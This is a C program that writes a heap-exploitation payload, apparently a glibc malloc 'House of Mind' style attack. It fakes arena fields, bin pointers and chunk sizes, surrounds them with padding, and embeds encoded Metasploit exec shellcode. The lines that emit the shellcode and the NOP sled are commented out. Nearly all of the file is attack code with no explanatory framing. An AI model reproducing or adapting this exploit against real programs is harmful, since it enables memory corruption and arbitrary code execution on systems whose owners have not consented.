#include <stdio.h>

/* linux_ia32_exec -  CMD=/usr/bin/id Size=72 Encoder=PexFnstenvSub
http://metasploit.com */
unsigned char scode[] =
"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"
"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"
"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"
"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"
"\x5e\x9e\x39\xcb\xbf\x04\xea\x42";

int main (void) {

     int i, j;

   fwrite("\x41\x41\x41\x41\x41\x41\x41\x41", 8, 1, stdout); // fd 8
   fwrite("\x41\x41\x41\x41\x41\x41\x41\x41", 8, 1, stdout); // bk 16
   
   fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* mutex 20 */ 
   fwrite("\x02\x41\x41\x41", 4, 1, stdout); /* flags 24 */
   fwrite("\x41\x41\x41\x41\x41\x41\x41\x41", 8, 1, stdout); /* have_fastchunks 28 */
   fwrite("\x00\x00\x00\x00", 4, 1, stdout);
   fwrite("\x02\x00\x00\x00", 4, 1, stdout);
   fwrite("\x00\x00\x00\x00\x00\x00\x00\x00", 8, 1, stdout);

   for (i = 0; i < 122; i++)
          fwrite("\xe8\x0f\x70\x00\x00\x00\x00\x00", 8, 1, stdout); /* &av->bins[0]   WHERE_2_WRITE - 24*/

   fwrite("\x11\x04\x00\x00\x00\x00\x00\x00", 8, 1, stdout);

   for (i = 0; i < 331; i++) {
          fwrite("\x11\x04\x00\x00\x00\x00\x00\x00", 8, 1, stdout); /* PRESERVE SIZE   */
          for (j = 0; j < 1032; j++)
                  putchar(0x41);                    /* PADDING         */
   }
   for (i = 0; i < 48; i++)
	   fwrite("\x41\x41\x41\x41", 4, 1, stdout);

   for (i = 0; i < 104; i++)
	fwrite("\xf8\xe2\xff\xff\xff\x7f\x00\x00", 8, 1, stdout);
	   //fwrite("\x90\xba\x6a\x00\x00\x00\x00\x00", 8, 1, stdout);

   fwrite("\xeb\x0c\x90\x90\x90\x90\x90\x90", 8, 1, stdout); /* prev_size -> jump 0x0c */

   fwrite("\x41\x41\x41\x41\x41\x41\x41\x41", 8, 1, stdout); /* prev_size -> jump 0x0c address_of_WHAT*/
   fwrite("\x25\x00\x00\x00\x00\x00\x00\x00", 8, 1, stdout); /* size -> NON_MAIN_ARENA */
   for(i = 0; i < 16 / 8; i++)
	   fwrite("\x41\x41\x41\x41\x41\x41\x41\x41", 8, 1, stdout);
   fwrite("\x35\x00\x00\x00\x00\x00\x00\x00", 8, 1, stdout);
   fwrite("\x35\x00\x00\x00\x00\x00\x00\x00", 8, 1, stdout);
  // fwrite("\x90\x90\x90\x90\x90\x90\x90\x90" \
  //        "\x90\x90\x90\x90\x90\x90\x90\x90", 16, 1, stdout);  /* NOPS */

  // fwrite(scode, sizeof(scode), 1, stdout); /* SHELLCODE */

   return 0;
}
